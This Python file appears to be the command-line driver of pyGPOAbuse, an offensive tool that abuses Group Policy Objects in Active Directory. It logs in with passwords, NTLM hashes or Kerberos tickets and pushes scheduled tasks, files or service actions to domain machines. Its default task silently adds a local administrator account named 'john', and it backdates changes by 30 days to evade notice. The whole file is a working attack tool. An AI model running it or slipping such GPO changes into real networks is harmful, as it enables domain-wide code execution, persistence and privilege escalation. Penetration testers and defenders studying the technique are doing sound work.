"""
This tool is a partial python implementation of SharpGPOAbuse
https://github.com/FSecureLABS/SharpGPOAbuse
All credit goes to @pkb1s for his research, especially regarding gPCMachineExtensionNames

Also thanks to @airman604 for schtask_now.py that was used and modified in this project
https://github.com/airman604/schtask_now
"""

import argparse
import logging
import re
import sys

from impacket.smbconnection import SMBConnection
from impacket.examples.utils import parse_credentials

from pygpoabuse import logger
from pygpoabuse.gpo import GPO


parser = argparse.ArgumentParser(add_help=True, description="Add ScheduledTask to GPO")

parser.add_argument('target', action='store', help='domain/username[:password]')
parser.add_argument('-gpo-id', action='store', metavar='GPO_ID', help='GPO to update ')
parser.add_argument('-gpo-type', action='store', default="Machine", choices=['User', 'Machine'], help='Set GPO type (Default: Machine)')


parser.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
parser.add_argument('-k', action='store_true', help='Use Kerberos authentication. Grabs credentials from ccache file '
                                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                                        'cannot be found, it will use the ones specified in the command '
                                        'line')
parser.add_argument('-dc-ip', action='store', help='Domain controller IP or hostname')
parser.add_argument('-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
parser.add_argument('-ccache', action='store', help='ccache file name (must be in local directory)')
parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')

method_subparsers = parser.add_subparsers(dest="method", help="method", required=True)

# scheduled task subparser
scheduled_task_parser = method_subparsers.add_parser("scheduled_task", help="Add scheduled task")
scheduled_task_parser.add_argument('-taskname', action='store', help='Taskname to create. (Default: TASK_<random>)')
scheduled_task_parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
scheduled_task_parser.add_argument('-description', action='store', help='Task description (Default: Empty)')
scheduled_task_parser.add_argument('-powershell', action='store_true', help='Use Powershell for command execution')
scheduled_task_parser.add_argument('-command', action='store', help='Command to execute (Default: Add john:H4x00r123.. as local Administrator)')
scheduled_task_parser.add_argument('-f', action='store_true', help='Force add ScheduleTask')

# Create file subparser
create_file_parser = method_subparsers.add_parser("file", help="Create file")
create_file_parser.add_argument('-source-path', '-s', nargs=1, type=str, action='store', required=True, help='Source file path to be copied')
create_file_parser.add_argument('-destination-path', '-d', nargs=1, type=str, action='store', required=True, help='destination file path')
create_file_parser.add_argument('-action', '-a', nargs=1, type=str, action='store', choices=['create', 'replace', 'update', 'delete'], required=True, help='Action')
create_file_parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
create_file_parser.add_argument('-f', action='store_true', help='Force add File')

# Restart service subparser
restart_service_parser = method_subparsers.add_parser("service", help="Restart service")
restart_service_parser.add_argument('-service-name', '-s', nargs=1, type=str, action='store', required=True, help='The name of the service')
restart_service_parser.add_argument('-action', '-a', nargs=1, type=str, action='store', choices=['start', 'restart', 'stop'], required=True, help='Action')
restart_service_parser.add_argument('-mod-date', action='store', help='Task modification date (Default: 30 days before)')
restart_service_parser.add_argument('-f', action='store_true', help='Force add Service')

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

options = parser.parse_args()

if not options.gpo_id:
    parser.print_help()
    sys.exit(1)

# Init the example's logger theme
logger.init()

if options.v == 1:
    logging.getLogger().setLevel(logging.INFO)
elif options.v >= 2:
    logging.getLogger().setLevel(logging.DEBUG)
else:
    logging.getLogger().setLevel(logging.ERROR)

domain, username, password = parse_credentials(options.target)

if options.dc_ip:
    dc_ip = options.dc_ip
else:
    dc_ip = domain

if domain == '':
    logging.critical('Domain should be specified!')
    sys.exit(1)

if password == '' and username != '' and options.hashes is None and options.k is False:
    from getpass import getpass
    password = getpass("Password:")
elif options.hashes is not None:
    if ":" not in options.hashes:
        logging.error("Wrong hash format. Expecting lm:nt")
        sys.exit(1)

if options.ldaps:
    protocol = 'ldaps'
else:
    protocol = 'ldap'

if options.k:
    if not options.ccache:
        logging.error('-ccache required (path of ccache file, must be in local directory)')
        sys.exit(1)
    ldap_url = '{}+kerberos-ccache://{}\\{}:{}@{}/?dc={}'.format(protocol, domain, username, options.ccache, dc_ip, dc_ip)
elif password != '':
    ldap_url = '{}+ntlm-password://{}\\{}:{}@{}'.format(protocol, domain, username, password, dc_ip)
    lmhash, nthash = "",""
else:
    ldap_url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
    lmhash, nthash = options.hashes.split(":")


def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
    try:
        smb_session = SMBConnection(address, target_ip)
        smb_session.login(username, password, domain, lmhash, nthash)
        return smb_session
    except Exception as e:
        logging.error("Connection error")
        return False

try:
    smb_session = SMBConnection(dc_ip, dc_ip)
    if options.k:
        smb_session.kerberosLogin(user=username, password='', domain=domain, kdcHost=dc_ip)
    else:
        smb_session.login(username, password, domain, lmhash, nthash)
except Exception:
    logging.error("SMB connection error", exc_info=True)
    sys.exit(1)

try:
    gpo = GPO(smb_session, ldap_url)
    if options.method == 'scheduled_task':
        result = gpo.update_scheduled_task(
            domain=domain,
            gpo_id=options.gpo_id,
            gpo_type=options.gpo_type,
            name=options.taskname,
            mod_date=options.mod_date,
            description=options.description,
            powershell=options.powershell,
            command=options.command,
            force=options.f
        )
        if result:
            logging.success(f"ScheduledTask {options.taskname} created!")
    elif options.method == 'file':
        result = gpo.update_file(
            domain=domain,
            gpo_id=options.gpo_id,
            gpo_type=options.gpo_type,
            source_path=options.source_path[0],
            destination_path=options.destination_path[0],
            action=options.action[0],
            mod_date=options.mod_date,
            force=options.f
        )
        if result:
            logging.success("File gpo created!")
    elif options.method == 'service':
        if options.gpo_type == 'User':
            raise Exception('gpo type User is not supported for services')

        result = gpo.update_service(
            domain=domain,
            gpo_id=options.gpo_id,
            gpo_type=options.gpo_type,
            service_name=options.service_name[0],
            action=options.action[0],
            mod_date=options.mod_date,
            force=options.f
        )
        if result:
            logging.success("Service gpo created!")


except Exception:
    logging.error("An error occurred. Use -vv for more details", exc_info=True)
